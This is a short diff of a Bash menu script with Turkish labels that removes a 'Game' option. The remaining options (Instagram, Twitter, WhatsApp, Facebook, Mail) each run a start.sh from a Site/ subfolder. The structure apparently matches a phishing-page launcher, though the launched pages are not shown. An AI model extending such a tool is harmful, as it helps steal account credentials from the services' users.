@@ -53,7 +53,7 @@ echo -e '\033[31;40;1m
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
 \e[31m[02]\e[32mTwitter			\e[31m[05]\e[32mMail
-\e[31m[03]\e[32mWhatsapp			\e[31m[06]\e[32mGame (Oyunlar)
+\e[31m[03]\e[32mWhatsapp			
 
 \e[31m[00] Code
 
@@ -95,12 +95,6 @@ elif [[ $islem == 5 || $islem == 05 ]]; then
 	sleep 1
 	clear
 	cd  Site/Mail/
-	bash start.sh
-
-elif [[ $islem == 6 || $islem == 06 ]]; then
-	sleep 1
-	clear
-	cd  Site/Game/
 	bash start.sh
 elif [[ $islem == 00 ]]; then
 
